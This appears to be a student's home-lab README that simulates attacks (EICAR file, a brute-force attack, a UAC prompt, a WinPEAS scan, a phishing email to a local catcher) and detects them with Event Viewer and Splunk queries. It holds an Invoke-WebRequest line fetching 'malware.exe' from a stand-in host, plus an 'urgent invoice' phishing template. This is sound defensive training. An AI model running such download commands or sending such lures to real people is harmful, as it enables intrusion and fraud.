# Multi-Incident-Response-Report

## 🔨 Brute-Force Attack Incident Response Report
This project simulates a real-world incident response using a brute-force login attack. I investigated the incident using Splunk logs, documented key Indicators of Compromise (IoCs), and mapped the behaviour to MITRE ATT&CK.
See `Brute_Force_incident_report.md` for the full report. Additionally, to see how a  Brute-force attack was done, please visit my [Splunk-threat-hunting-lab](https://github.com/Mr-ebony/Splunk-threat-hunting-lab.git) project.

## 🦠 Malware Execution Using EICAR (Safe Simulation)

### Steps
+ **Open Browser on the Windows VM**
+ Visit the official EICAR test file site (Please see **Image 1** within Screenshots/Malware )
  🔗 [https://www.eicar.org/download-anti-malware-tesfile/](https://www.eicar.org/download-anti-malware-tesfile/)
+ Download the `eicar.com` file - your antivirus or Windows Defender will likely alert or block it (Please see **Image 3** within Screenshots/Malware).
  #### Alternative way to download if it is blocked (Manual Method) (Please see **Image 2** within Screenshots/Malware)
  +  Open Notepad (or any text editor)
  +  Paste this exact string on a single line:
  +  ```spl
     X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
     ```
  + Name the file:
    ```spl
    eicar.com
    ```
  + Save it to your *Desktop or a dedicated test folder like `C:\EICAR_TEST`
  ✅ Done! You now have a test virus file.
+ Attempt to run it on your desktop (it will likely get a block event) (Please see **Image 4** within Screenshots/Malware).
+ Open **Windows Event Viewer → Applications and Services Logs → Microsoft → Windows → Windows Defender → Operational**, look for logs from `Window Defender`
### Common IOCs that can be extracted from Windows Defender Malware Logs
| IoC Type             | Description / Example           | 
|--------------------|---------------------|
| Timestamp | When the malware was detected         |
|  Threat Name   | Malware family name (e.g., Trojan:Win32/Emotet)      |
| Severity Name | Info/ Low/ Moderate/ High/ Severe         |
| File Path    | Exact path of the infected file (e.g., C:\Users\User\AppData\Temp\badfile.exe)      |
| File Name | Name of the malicious file (badfile.exe)         |
| SHA-256 or MD5    | Hash of the malicious file (if Defender captures it)      |
| Action Name | Quarantined, Removed, Blocked. Allowed         |
| Detection Source Name  | Real-time, Scheduled scan, On-demand Scan, etc.      |
| Process Name | The process that dropped or executed the malware (Powershell.exe, cmd.exe, etc)         |
| Remediation Status    | Whether the threat was successfully removed or is still active      |
| User | Which user account triggered the detection         |
| Device Name / Hostname    | The machine where the threat was found     |
| IP Address (indirect) | Might be found if malware attempted outbound communication (Check Event ID 5156)         |

### Event IDs to Watch For:
| Event ID             | Meaning           | 
|--------------------|---------------------|
| 1116 | Malware detected         |
| 1117   | Malware action taken      |
| 1118 | Malware cleaned successfully         |
| 5007    | Settings changed      |

---

## 🧨Powershell Attack
### Steps
+ **Open PowerShell as Administrator on the Windows VM**
+ Run the following harmless but suspicious command (Please see **Image 1 and 2** within Screenshots/Malware):

  ```spl
  
  Invoke-WebRequest -Uri "http://test.com/malware.exe" -OutFile "C:\Users\Public\Downloads\malware.exe"
  ```
  + Check **Windows Event Viewer** under (Please see **Image 3** within Screenshots/Malware):
    + ` Windows Event Viewer → Applications and Services Logs → Microsoft → Windows → Powershell → Operational`
    + Event ID: `4104` (script block logging)
   
### ✨Common IOCs from a PowerShell Suspicious Command (Blocked) Log
| IoC Type             | Description / Example           | 
|--------------------|---------------------|
| Timestamp | Exact time the command was executed or blocked (from the log)         |
|  User Account   | `user: DESKTOP\User1` - the account that ran the PowerShell Session      |
| Hostname/Device | The name of the computer where the script ran         |
| Script Block Content    | The actual **PowerShell command or script** (base64, obfuscated, etc.)     |
| File Path (if any) | Path of dropped/executed file (e.g., C:\Users\User\Downloads\malicious.ps1)          |
| Network IOCs    | IPs, URLs, or domains inside the script (e.g., http://malicious[.]com/payload)      |
| Encoded Commands | Base64 strings used in commands like `powershell.exe -EncodedCommand...`         |
| Parent Process  | What launched PowerShell (e.g., `winword.exe`, `cmd.exe`, `explorer.exe`      |
| Process ID (PID) | Useful to correlate with other system or security events        |
| Event ID    | e.g. 4104 (script block), 4105 (blocked execution), 4688 (process creation)      |
| Command Line | Full command line arguments passed to `powershell.exe`         |
| Obfuscation Indicators    | Usage of `Invoke-Expression`, `FromBase64String`, `IEX`, etc.     |

### ✨Why These IOCs Matter
+ Helps detect **malicious PowerShell Usage**, which is common in:
  + Lateral movement: The attacker already got into one computer, now they’re sneaking into others on the same network, like hopping from room to room in a house.
  + Persistence: The attacker wants to remain hidden and maintain access even if the system reboots or security updates are applied.
  + Command and control (C2): The attacker’s computer is like a boss giving orders. Your infected system talks back to the boss over the internet, receiving instructions.
  + Payload delivery: The attacker drops the actual “bad stuff” (like a virus or ransomware) into the system, which is the weapon they use.
+ Can be used in:
  + SIEM detection rules: These are automated rules set in a SIEM tool (like Splunk or Wazuh) to spot suspicious activity, like failed logins, PowerShell abuse, or malware behaviour, and raise alerts when something unusual happens.
  + YARA rules: These are used to detect malware by matching patterns or strings in files, memory, or emails.
  + Threat hunting queries: These are manual searches done by analysts to actively look for threats before alarms go off. They dig into logs or system behaviour to find things that look odd or hidden.
  + Threat intelligence enrichment: This means adding extra context to raw data (like an IP address) to know if it’s bad, who owns it, what threat group uses it, etc.

---

 ## 🧨Privilege Escalation Attempts
### Step 1: Create a Low-Privilege User 
+ Open Command Prompt as **Administrator**
+ Run two simple commands:
  - To create the user
  - To assign the use to the "Users" group (default, non-admin group) (Please see **Image 1** within Screenshots/Privilege_escalation )
 ```spl
  net user samson1 Password /add
  net localgroup "Users" samson1 /add
  ```
**Note:** **Images 2 and 3** show commands to view and delete a low-privilege user account. Also, **Image 4** shows the created account.
### Step 2: Simulate a Privilege Escalation Attack 
I tried two beginner-friendly options: 
#### **Option 1: Simulate UAC Bypass (Manual)**
I tried to simulate what a malicious program might do to elevate privileges by running a known UAC bypass (just for lab practice).
1. Log into the Windows VM as `samson1`.
2. Open **Notepad** and paste this:
 
  ```spl
  Start-Process powershell -Verb runAs
  ```
3. Save it as `bypass.ps1`.
4. Run it via PowerShell (right-click → Run with ***PowerShell***).
🗝 This triggers a **UAC prompt**. If the attacker knows the admin password, they can elevate privileges (please see **Image 5-6** within Screenshots/Privilege_escalation).
#### What to watch for in the logs:
+ **Event ID 4672:** Special privileges assigned to new logon.
+ **Event ID 4688:** New process creation.
+ **Event ID 4624:** Logon event with elevated privileges.

#### **Option 2: Use WinPEAS (Automated Escalation Scanner)**
This tool scans for privilege escalation vectors.
1. Download WinPEAS.exe from GitHub on your **Windows VM:**
   https://github.com/carlospolop/PEASS-ng/releases/
2. Run it as the low-privileged user (just double-click the file) (Please see **Image 7-8** within Screenshots/Privilege_escalation ).
3. Observe the scan output. It will show misconfigurations like:
   - Services running with SYSTEM privileges
   - AlwaysInstallElevated registry keys
   - Weak folder permissions
  
### Step 3: View Events in Windows Event Viewer
1. On Windows VM, Open Event Viewer → `windows Logs` → `security`.
2. Look for (Please see **Image 9-11** within Screenshots/Privilege_escalation ):
   + `4624`: Successful logon
   + `4672`: Special privileges assigned
   + `4688`: New process created (e.g., powershell.exe)
   + `4697`: Service installed (if you simulate service abuse)

### Step 4: Detect in Splunk
Go to your Splunk dashboard and run queries like:

 ```spl
  index=wineventlog EventCode=4672 OR EventCode=4688 OR EventCode=4624
 ```
Or more targeted:

```spl
  index=wineventlog EventCode=4672 Account_Name="samson1"
```
We can create an alert for any time a standard user receives admin privileges.

---

 ## 📨 Phishing Simulation (safe attachment)
 
 ### What will be built 
 + A **local SMTP “catcher”** so you can send/see test emails (no real delivery).
 + A **fake invoice email** with a **safe attachment** and a **benign link**.
 + Basic **telemetry**: Windows Event Logs → **Splunk**.
We’ll use **smtp4dev** (free, tiny app) to catch emails on your Windows VM.

### Step 0 - Prep logging on Windows (One-time)
This will allow Splunk to see helpful details: 
**1. Enable process Creation auditing (Please see Image 1-2 within Screenshots/Phishing)**
+ Open: `Local Security Policy` → **Advanced Audit Policy Configuration** → **Detailed Tracking** → **Audit Process Creation** → check **Success**.
+ Then enable command-line logging:
`Local Group Policy Editor → Local Computer Policy → Administrative Templates → System → Audit Process Creation → Include command line in process creation events → Enabled`

Or via commands (run as Admin CMD/PowerShell):

```cmd
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" ^
 /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

```
**2. Confirm Splunk is ingesting Security logs (Please see Image 3 within Screenshots/Phishing)**
+ In Splunk, `Settings → Add Data → Monitor → Local Event Logs` → select `WinEventLog:Security`.

### Step 1 - Install a local email “catcher” (smtp4dev) (Please see Image 4 within Screenshots/Phishing)

1. Download and install **smtp4dev** on the **Windows VM** (default listens on `127.0.0.1:2525`).#
2. Launch it; you’ll see an inbox UI in your browser/app.
(Any email you send to `localhost:2525` will appear here — nothing leaves your machine.)

### Step 2 - Create the safe attachment (Please see Image 5 within Screenshots/Phishing)
The option below is used:
- Create `invoice.docx` in Word with harmless text and a link (e.g., `http://192.168.0.66:8000/pay`).

### Step 3 - Track link clicks (Please see Image 6-7 within Screenshots/Phishing)
In addition to the option in step 2, I decided to spin up a tiny web server so you can see a request when the user clicks the link.
- On Kali (bash) (or any box with Python):
```bash
python3 -m http.server 8000
```
Note your Kali IP (e.g., 192.168.0.66). Use http://192.168.0.66:8000/pay in your email body.
When the link is clicked, you’ll see a GET /pay line in the terminal. (If you’d rather host on Windows and you have Python installed there, same command works.)

### Step 4 - Send the phishing email to your local inbox (Please see Image 8-9 within Screenshots/Phishing)
Use **PowerShell** on the **Windows VM** (as a normal user is fine):

```powershell
$Smtp = "127.0.0.1"
$Port = 25
$To   = "client@lab.local"
$From = "finance <finance@lab.local>"
$Subject = "Urgent: Invoice Due Immediately"
$Body = @"
Hi,

Please review the attached invoice and complete payment today:
http://192.168.0.66:8000/pay

Thanks,
Accounts
"@
$Attachment = "C:\Home Lab\invoice.docx"
#Send the email
Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -SmtpServer $Smtp -Port $Port -Attachments $Attachment
```
If `Send-MailMessage` is unavailable, you can attach without sending: just **drag & drop** the file into smtp4dev’s web UI (it supports test composition), or send via a tiny Python script — but the PowerShell cmdlet is usually present.

### Step 5 - "Victim" action (Please see Image 10-12 within Screenshots/Phishing)
1. Open smtp4dev → click your message → download/open the **attachment**.
2. (Optional) Click the **link** in the email body.
3. Take screenshots: the email, the attachment open (Word), macro banner (if `.docm`), and any web-server hit.

### Step 6 - Review logs
#### Event Viewer (Windows VM)
- `Windows Logs → Security`
  - **4688** — A new process has been created (e.g., `WINWORD.EXE`, `EXCEL.EXE`, `msedge.exe`/`chrome.exe`)
  - (Optional, if enabled) 5156/5158 — Filtering Platform connection allowed/ended (network)
- `Applications and Services Logs → Microsoft → Windows → Windows Defender → Operational`
  - If Defender flags anything (it shouldn’t for our benign doc).

#### Splunk searches
Try these (adjust index/source to your setup):

```spl

source="WinEventLog:Security" EventCode=4688
| rex "New Process Name:\s+(?<new_process>.*)"
| rex "Creator Process Name:\s+(?<parent_process>.*)"
| rex "Command Line:\s+(?<cmdline>.*)"
| search new_process="*\\WINWORD.EXE" OR new_process="*\\EXCEL.EXE" OR new_process="*\\chrome.exe" OR new_process="*\\msedge.exe"
| table _time Account_Name new_process parent_process cmdline ComputerName

```
If you clicked the link to your Kali server and enabled Filtering Platform logs:

```spl

source="WinEventLog:Security" (EventCode=5156 OR EventCode=5158)
| search DestAddress="<KALI_IP>"
| table _time SourceAddress DestAddress Application

```
If you later install Sysmon, you’ll get cleaner fields:

- **Event ID 1 (Process Create), Event ID 3 (Network Connect) — highly recommended for richer detections.**


### Step 7 - Add a simple Splunk alert (optional but nice)
Detect Office apps launched from **Downloads** or **Temp** (common phishing behaviour):

```spl
source="WinEventLog:Security" EventCode=4688
| rex "New Process Name:\s+(?<proc>.*)"
| rex "Command Line:\s+(?<cmd>.*)"
| search proc="*\\WINWORD.EXE" OR proc="*\\EXCEL.EXE" OR proc="*\\POWERPNT.EXE"
| where like(cmd, "%\\Users\\%\\Downloads\\%") OR like(cmd, "%\\AppData\\Local\\Temp\\%")

```
Save As → **Alert** → every 5 minutes → trigger if results > 0.

